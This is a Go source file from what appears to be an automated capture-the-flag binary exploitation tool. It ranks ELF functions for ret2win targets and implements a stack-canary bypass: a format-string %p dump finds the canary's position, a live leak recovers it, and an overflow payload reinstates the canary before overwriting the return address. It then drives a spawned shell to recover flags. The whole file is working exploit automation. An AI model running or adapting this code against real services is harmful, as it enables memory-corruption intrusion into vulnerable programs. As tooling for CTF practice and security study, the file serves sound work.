package solve

import (
	"bytes"
	"context"
	"debug/elf"
	"fmt"
	"regexp"
	"sort"
	"strconv"
	"strings"

	"github.com/MoriartyPuth/PwnProbes/internal/extract"
	"github.com/MoriartyPuth/PwnProbes/internal/inspect"
	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

var winNameRe = regexp.MustCompile(`(?i)win|flag|backdoor|shell|magic|secret|admin|getshell|cat`)

func isCRTName(n string) bool {
	switch n {
	case "_start", "_init", "_fini", "__libc_csu_init", "__libc_csu_fini",
		"register_tm_clones", "deregister_tm_clones", "frame_dummy",
		"__do_global_dtors_aux", "_dl_relocate_static_pie", "__libc_start_main",
		"__gmon_start__", "abi_tag", "_IO_stdin_used":
		return true
	}
	return false
}

type funcEntry struct {
	name string
	addr uint64
}

// orderedWinFunctions returns the target's defined functions with CRT and
// compiler stubs dropped, ordered so that functions whose name suggests a "win"
// (win, flag, shell, ...) come first, then by address. This makes a ret2win or a
// GOT redirect land in a handful of attempts rather than a sweep over every
// symbol.
func orderedWinFunctions(bin inspect.Report) []funcEntry {
	var fns []funcEntry
	seen := map[uint64]bool{}
	for _, sym := range bin.Functions {
		var a uint64
		if _, err := fmt.Sscanf(sym.Address, "0x%x", &a); err != nil || a == 0 || seen[a] || isCRTName(sym.Name) {
			continue
		}
		seen[a] = true
		fns = append(fns, funcEntry{sym.Name, a})
	}
	sort.SliceStable(fns, func(i, j int) bool {
		wi, wj := winNameRe.MatchString(fns[i].name), winNameRe.MatchString(fns[j].name)
		if wi != wj {
			return wi
		}
		return fns[i].addr < fns[j].addr
	})
	return fns
}

// ret2winTails builds return-address tails from the ordered win functions, with
// a stack-aligning ret variant for each.
func ret2winTails(bin inspect.Report, ret uint64, haveRet bool) []tail {
	width := 8
	if bin.Bits == 32 {
		width = 4
	}
	var tails []tail
	for _, f := range orderedWinFunctions(bin) {
		b := addrBytes(f.addr, width)
		tails = append(tails, tail{bytes: b, note: fmt.Sprintf("win=0x%x(%s)", f.addr, f.name)})
		if haveRet && width == 8 {
			tails = append(tails, tail{bytes: append(addrBytes(ret, width), b...), note: fmt.Sprintf("ret+win=0x%x(%s)", f.addr, f.name)})
		}
	}
	return tails
}

// maxCanaryAttempts bounds the canary-bypass search.
const maxCanaryAttempts = 900

var hexValRe = regexp.MustCompile(`0x[0-9a-fA-F]+`)

// looksLikeCanary distinguishes a glibc x86-64 stack canary from a leaked
// pointer: a canary's low byte is zero and it uses the full 64 bits, while a
// userspace pointer is 48-bit, so its top 16 bits are zero.
func looksLikeCanary(v uint64) bool { return v&0xff == 0 && v>>48 != 0 }

func canaryOffsets() []int {
	out := []int{}
	for v := 8; v <= 256; v += 8 {
		out = append(out, v)
	}
	return out
}

// canaryStrategy defeats a stack canary when the target also leaks the stack
// through a format string (the common "leak then overflow" shape). It first
// finds the canary's argument position in the leak, then for each padding length
// and ret2win target it opens a connection, leaks that position live, and sends
// an overflow that reinstates the canary before overwriting the return address,
// so the stack check passes. A canary with no leak cannot be bypassed this way.
func (s *solver) canaryStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["canary"].Status != "present" {
		return false, nil
	}
	if bin.Protections["pie"].Status == "enabled" {
		s.report.Limitations = append(s.report.Limitations, "canary present on a PIE binary; canary bypass here needs a non-PIE win target")
		return false, nil
	}
	f, err := elf.Open(s.path)
	if err != nil {
		return false, err
	}
	ret, haveRet := retGadget(f)
	f.Close()
	funcTails := ret2winTails(bin, ret, haveRet)
	if len(funcTails) == 0 {
		return false, nil
	}
	indices, err := s.locateCanaryIndices(ctx)
	if err != nil {
		return false, err
	}
	if len(indices) == 0 {
		s.report.Limitations = append(s.report.Limitations, "no canary-shaped value found via a format-string leak; canary bypass needs a leak")
		return false, nil
	}
	attempts := 0
	for _, idx := range indices {
		for _, off := range canaryOffsets() {
			for _, t := range funcTails {
				if err := ctx.Err(); err != nil {
					return false, err
				}
				if attempts >= maxCanaryAttempts {
					s.report.Limitations = append(s.report.Limitations, fmt.Sprintf("canary search stopped at the %d-attempt cap", maxCanaryAttempts))
					return false, nil
				}
				attempts++
				done, err := s.canaryAttempt(ctx, idx, off, t)
				if err != nil || done {
					return done, err
				}
			}
		}
	}
	return false, nil
}

// locateCanaryIndices sends one delimited %p dump and returns the argument
// positions whose value looks like a canary.
func (s *solver) locateCanaryIndices(ctx context.Context) ([]int, error) {
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return nil, err
	}
	defer cleanup()
	defer conn.Close()
	_ = conn.RecvUntilIdle(s.idle())
	var b strings.Builder
	for i := 0; i < 50; i++ {
		b.WriteString("%p.")
	}
	if err := conn.Send([]byte(b.String() + "\n")); err != nil {
		return nil, nil
	}
	mid := string(conn.RecvUntilIdle(s.idle()))
	var idxs []int
	for i, f := range strings.Split(mid, ".") {
		m := hexValRe.FindString(f)
		if m == "" {
			continue
		}
		v, err := strconv.ParseUint(m[2:], 16, 64)
		if err == nil && looksLikeCanary(v) {
			idxs = append(idxs, i+1) // field index (1-based) == vararg position
		}
	}
	return idxs, nil
}

// canaryAttempt leaks the canary at idx, then sends padding + canary + saved-rbp
// filler + the ret2win tail.
func (s *solver) canaryAttempt(ctx context.Context, idx, off int, t tail) (bool, error) {
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return false, err
	}
	defer cleanup()
	defer conn.Close()
	_ = conn.RecvUntilIdle(s.idle())
	if err := conn.Send([]byte(fmt.Sprintf("%%%d$p\n", idx))); err != nil {
		return false, nil
	}
	leak := string(conn.RecvUntilIdle(s.idle()))
	m := hexValRe.FindString(leak)
	if m == "" {
		return false, nil
	}
	canary, err := strconv.ParseUint(m[2:], 16, 64)
	if err != nil || !looksLikeCanary(canary) {
		return false, nil
	}
	payload := make([]byte, 0, off+16+len(t.bytes))
	for i := 0; i < off; i++ {
		payload = append(payload, 'A')
	}
	payload = append(payload, qword(canary)...)
	payload = append(payload, []byte("BBBBBBBB")...) // saved rbp
	payload = append(payload, t.bytes...)
	if bytes.IndexByte(payload, '\n') >= 0 {
		return false, nil
	}
	line := append(payload, '\n')
	if err := conn.Send(line); err != nil {
		return false, nil
	}
	mid := string(conn.RecvUntilIdle(s.idle()))
	_ = conn.Send([]byte(driveShell))
	post := string(conn.RecvUntilIdle(s.idle()))
	out := leak + mid + post

	input := append(append([]byte{}, line...), []byte(driveShell)...)
	cands := s.ex.Find(out, input, "session")
	recovered := extract.Recovered(cands)
	a := Attempt{
		Strategy:  "canary_ret2win",
		Payload:   string(line),
		Note:      fmt.Sprintf("canary_idx=%d padding=%d canary=%#x tail=%s", idx, off, canary, t.note),
		Result:    runner.Result{Outcome: "session", ExitCode: -1, Stdout: out},
		Candidate: cands,
		Recovered: recovered,
	}
	s.report.Attempts = append(s.report.Attempts, a)
	if len(recovered) > 0 {
		s.report.Solved = true
		s.report.Flags = recovered
		winner := a
		s.report.Winning = &winner
		return true, nil
	}
	return false, nil
}
